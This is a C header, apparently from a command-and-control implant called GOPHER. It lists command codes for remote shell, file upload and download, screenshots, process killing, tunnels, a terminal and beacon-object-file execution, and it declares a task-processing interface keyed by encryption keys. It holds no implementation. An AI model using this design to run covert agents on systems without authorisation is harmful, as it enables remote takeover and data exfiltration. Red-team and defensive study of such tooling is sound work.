//
// Created by seba on 10/17/26.
//

#ifndef GOPHER_TASKS_H
#define GOPHER_TASKS_H

#include "common.h"
#include "profile.h"

#define COMMAND_ERROR           0
#define COMMAND_PWD             1
#define COMMAND_CD              2
#define COMMAND_SHELL           3
#define COMMAND_EXIT            4
#define COMMAND_DOWNLOAD        5
#define COMMAND_UPLOAD          6
#define COMMAND_CAT             7
#define COMMAND_CP              8
#define COMMAND_MV              9
#define COMMAND_MKDIR           10
#define COMMAND_RM              11
#define COMMAND_LS              12
#define COMMAND_PS              13
#define COMMAND_KILL            14
#define COMMAND_ZIP             15
#define COMMAND_SCREENSHOT      16
#define COMMAND_RUN             17
#define COMMAND_JOB_LIST        18
#define COMMAND_JOB_KILL        19
#define COMMAND_REV2SELF        20

#define COMMAND_TUNNEL_START    31
#define COMMAND_TUNNEL_STOP     32
#define COMMAND_TUNNEL_PAUSE    33
#define COMMAND_TUNNEL_RESUME   34

#define COMMAND_TERMINAL_START  35
#define COMMAND_TERMINAL_STOP   36

#define COMMAND_EXEC_BOF        50
#define COMMAND_EXEC_BOF_OUT    51
#define COMMAND_EXEC_BOF_ASYNC  52

#define EXFIL_PACK     2
#define JOB_PACK       3
#define TUNNEL_PACK    4
#define TERMINAL_PACK  5

// Set globals needed by download jobs. Call once before command loop.
void tasks_init(Profile *prof, uint8_t *enc_key, uint8_t *session_key, uint32_t agent_id);

// Process one command in place. Caller must free new cmd->data after encoding.
int task_process(Command *cmd, int *active);

#endif
